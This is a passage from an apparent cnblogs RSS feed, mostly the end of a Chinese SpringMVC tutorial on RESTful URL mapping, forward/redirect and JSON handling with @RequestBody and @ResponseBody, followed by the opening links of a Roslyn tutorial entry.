&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;updateByIdNormal&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String updateByIdNormal(Integer id) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(id);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;redirect:listAll.do&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;访问的地址为：http://localhost:8080/day63_SpringMVC_02/user/updateByIdNormal.do?id=1&lt;/p&gt;
&lt;h3 id=&quot;h112restfull&quot;&gt;&lt;span&gt;&lt;strong&gt;11.2、Restfull风格设计模式修改&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;（1）初始Restfull风格设计模式修改&lt;/strong&gt;&lt;br/&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/updateByIdRestfull/${user.id}.do&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;修改&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;updateByIdRestfull/{id}&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String updateByIdRestfull(&lt;span class=&quot;hljs-meta&quot;&gt;@PathVariable&lt;/span&gt; Integer id) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(id);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;redirect:/user/listAll.do&quot;&lt;/span&gt;; &lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;访问的地址为：http://localhost:8080/day63_SpringMVC_02/user/updateByIdRestfull/1.do&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）最终Restfull风格设计模式修改&lt;/strong&gt;&lt;br/&gt;  &lt;strong&gt;约定：&lt;/strong&gt;&lt;code&gt;在web.xml配置拦截方式：在rest目录下所有请求都被拦截，servlet可以拦截目录。&lt;/code&gt;&lt;br/&gt;web.xml中配置代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;springmvc&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;/rest/*&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/rest/user/updateByIdRestfull/${user.id}&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;修改&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;updateByIdRestfull/{id}&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String updateByIdRestfull(&lt;span class=&quot;hljs-meta&quot;&gt;@PathVariable&lt;/span&gt; Integer id) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(id);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;redirect:/user/listAll.do&quot;&lt;/span&gt;; &lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;访问的地址为：http://localhost:8080/day63_SpringMVC_02/rest/user/updateByIdRestfull/1&lt;br/&gt;其中：&lt;br/&gt;  {id}：表示匹配接受页面url路径中的参数&lt;br/&gt;  @Pathariable：表示{id}里面参数注入后面参数id里面&lt;br/&gt;  &lt;code&gt;url模版映射需要@RequestMapping和@PathVariable结合使用。&lt;/code&gt;&lt;br/&gt;画图理解URL模版映射，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbjOB.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h113eclipsespringtoolssuite&quot;&gt;&lt;span&gt;&lt;strong&gt;11.3、在线安装eclipse提示插件--Spring tools suite&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;步骤：Help --&amp;gt; Eclipse Marketplace… --&amp;gt; 在Find中输入Spring tools suite，点击安装即可。&lt;br/&gt;安装成功后的截图如下：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbGe6.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h12&quot;&gt;&lt;span&gt;&lt;strong&gt;12、转发和重定向&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h121&quot;&gt;&lt;span&gt;&lt;strong&gt;12.1、转发&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;本类中进行转发：本类中方法与方法之间进行forward
&lt;ul&gt;&lt;li&gt;&lt;span&gt;关键字：forward&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;转发方式一：return &quot;forward:listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;转发方式二：return &quot;/user/forward:listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注意：&lt;/strong&gt;`user根路径前面必须有/。`&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;跨类进行转发：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;转发方式：return &quot;forward:/items/listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;测试代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;forward&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String forward() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;forward:/items/listAll.do&quot;&lt;/span&gt;; &lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h122&quot;&gt;&lt;span&gt;&lt;strong&gt;12.2、重定向&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;本类中进行重定向：本类中方法与方法之间进行redirect
&lt;ul&gt;&lt;li&gt;&lt;span&gt;关键字：redirect&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;重定向方式一：return &quot;redirect:listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;重定向方式二：return &quot;redirect:/user/listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;跨类进行重定向：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;重定向方式：return &quot;redirect:/items/listAll.do&quot;;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;测试代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;redirect&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String redirect() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;redirect:/items/listAll.do&quot;&lt;/span&gt;; &lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;h13mvcannotationdriven&quot;&gt;&lt;span&gt;&lt;strong&gt;13、标签&amp;lt;mvc:annotation-driven /&amp;gt;的使用&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;详解如下：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs makefile&quot; readability=&quot;3&quot;&gt;&lt;span class=&quot;hljs-section&quot;&gt;标签&amp;lt;mvc:annotation-driven /&amp;gt; 表示默认创建处理器映射器RequestMappingHandlerMapping、处理器映射器RequestMappingHandlerAdapter，还表示默认启动json格式数据的支持。&lt;/span&gt;&lt;p&gt;所以在springmvc.xml中就不要再配置处理器映射器和处理器映射器了。&lt;br/&gt;只需要配置这一句就可以了。&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;h14requestbodyresponsebody&quot;&gt;&lt;span&gt;&lt;strong&gt;14、RequestBody 和 ResponseBody&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;@RequestBody 和 @ResponseBody，这两个注解主要是为了&lt;code&gt;提供对json格式数据的支持。&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;@RequestBody的作用：把前台页面请求的json格式数据直接封装成JavaBean，使用ajax进行数据传递。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;@ResponseBody的作用：在后台，把JavaBean强制转换成json格式数据返回给前台页面。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这两个注解不能直接使用，需要依赖两个Jackson的jar包。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）先导入Jackson的jar包&lt;/strong&gt;&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbMgp.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;strong&gt;（2）在springmvc.xml中配置json格式转换&lt;/strong&gt;&lt;br/&gt;注意：我们也可以直接使用&lt;code&gt;&amp;lt;mvc:annotation-driven /&amp;gt;&lt;/code&gt;，因为该标签默认启动json格式数据的支持。
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;messageConverters&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.http.converter.json.MappingJacksonHttpMessageConverter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（3）请求json格式数据，返回json格式数据&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;（4）请求pojo格式数据，返回json格式数据&lt;/strong&gt;&lt;br/&gt;/day63_SpringMVC_02/WebRoot/WEB-INF/jsps/requestjson.jsp&lt;br/&gt;前台代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;language&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;java&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;pageEncoding&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/js/jquery.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;请求是json格式数据，返回是json格式数据&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;requestJson();&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;请求是pojo格式数据，返回是json格式数据&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;requestPojo();&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;requestJson&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; jsonObj = &lt;span class=&quot;hljs-built_in&quot;&gt;JSON&lt;/span&gt;.stringify({&lt;span class=&quot;hljs-string&quot;&gt;'username'&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'晓艺'&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;'age'&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'26'&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;'address'&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'物资学院'&lt;/span&gt;}); // stringify的作用：把json格式的数据数强转成json对象&lt;br/&gt;$.ajax({&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'post'&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;url&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'${pageContext.request.contextPath}/user/requestJson.do'&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'application/json;charset=UTF-8'&lt;/span&gt;, // 默认: &quot;application/x-www-form-urlencoded&quot;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;data&lt;/span&gt;:jsonObj,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;success&lt;/span&gt;:&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;data&lt;/span&gt;) &lt;/span&gt;{ &lt;br/&gt;alert(data);&lt;br/&gt;}&lt;br/&gt;});&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;requestPojo&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; pojoObj = &lt;span class=&quot;hljs-string&quot;&gt;'username=黑泽&amp;amp;age=26&amp;amp;address=青年路'&lt;/span&gt;;&lt;br/&gt;$.ajax({&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'post'&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;url&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'${pageContext.request.contextPath}/user/requestPojo.do'&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;data&lt;/span&gt;:pojoObj,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;success&lt;/span&gt;:&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;data&lt;/span&gt;) &lt;/span&gt;{ &lt;br/&gt;alert(data);&lt;br/&gt;}&lt;br/&gt;});         &lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;后台代码：&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs kotlin&quot; readability=&quot;6&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;toJson&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String tiJson() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;requestjson&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;requestJson&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-meta&quot;&gt;@ResponseBody&lt;/span&gt; User requestJson(&lt;span class=&quot;hljs-meta&quot;&gt;@RequestBody&lt;/span&gt; User user) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(user);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; user;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;requestPojo&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-meta&quot;&gt;@ResponseBody&lt;/span&gt; User requestPojo(User user) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(user);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; user;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 26 Oct 2018 06:18:00 +0000</pubDate>
<dc:creator>黑泽明军</dc:creator>
<og:description>1、JAVAEE体系结构 JAVAEE体系结构图如下所示： 2、什么是springmvc？ 什么是mvc？ Model1 Model2 SpringMVC是什么？ SpringMVC是一个web层mv</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenmingjun/p/9856070.html</dc:identifier>
</item>
<item>
<title>Rosyln入门（二）-C＃语义分析 - 范存威</title>
<link>http://www.cnblogs.com/fancunwei/p/9855834.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fancunwei/p/9855834.html</guid>
<description>&lt;p data-source-line=&quot;2&quot;&gt;&lt;a href=&quot;https://visualstudio.microsoft.com/zh-hans/downloads/&quot; target=&quot;_blank&quot;&gt;Visual Studio 2017&lt;/a&gt;&lt;/p&gt;
&lt;p data-source-line=&quot;4&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=VisualStudioProductTeam.NETCompilerPlatformSDK&quot; target=&quot;_blank&quot;&gt;.NET Compiler Platform SDK&lt;/a&gt;&lt;/p&gt;
&lt;p data-source-line=&quot;6&quot;&gt;&lt;a href=&quot;https://www.imooc.com/article/256758&quot; target=&quot;_blank&quot;&gt;Rosyln入门（一）-C＃语法分析&lt;/a&gt;&lt;/p&gt;

